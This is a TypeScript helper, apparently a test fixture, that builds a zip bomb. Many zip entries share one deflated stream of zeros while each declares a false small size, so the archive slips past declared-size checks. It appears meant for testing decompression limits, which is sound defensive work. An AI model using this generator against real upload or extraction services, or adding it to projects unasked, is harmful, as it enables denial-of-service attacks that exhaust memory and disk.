import { deflateRawSync } from "node:zlib";

/**
 * A zip whose entries (`p1.md`, `p2.md`, …) all point to one deflated stream
 * of zeros that inflates to `inflatedBytes`, while each entry declares
 * `declaredBytes`: a zip bomb that passes checks of the declared sizes.
 */
export function zipBomb(options: { entries: number; inflatedBytes: number; declaredBytes: number }) {
  const data = deflateRawSync(Buffer.alloc(options.inflatedBytes), { level: 9 });
  const name = (index: number) => Buffer.from(`p${index + 1}.md`);
  const local = Buffer.alloc(30 + name(0).length);
  local.writeUInt32LE(0x04034b50, 0);
  local.writeUInt16LE(20, 4);
  local.writeUInt16LE(8, 8);
  local.writeUInt32LE(data.length, 18);
  local.writeUInt32LE(options.declaredBytes, 22);
  local.writeUInt16LE(name(0).length, 26);
  name(0).copy(local, 30);
  const central: Buffer[] = [];
  for (let index = 0; index < options.entries; index += 1) {
    const header = Buffer.alloc(46 + name(index).length);
    header.writeUInt32LE(0x02014b50, 0);
    header.writeUInt16LE(20, 4);
    header.writeUInt16LE(20, 6);
    header.writeUInt16LE(8, 10);
    header.writeUInt32LE(data.length, 20);
    header.writeUInt32LE(options.declaredBytes, 24);
    header.writeUInt16LE(name(index).length, 28);
    header.writeUInt32LE(0, 42);
    name(index).copy(header, 46);
    central.push(header);
  }
  const directory = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(options.entries, 8);
  end.writeUInt16LE(options.entries, 10);
  end.writeUInt32LE(directory.length, 12);
  end.writeUInt32LE(local.length + data.length, 16);
  return new Uint8Array(Buffer.concat([local, data, directory, end]));
}
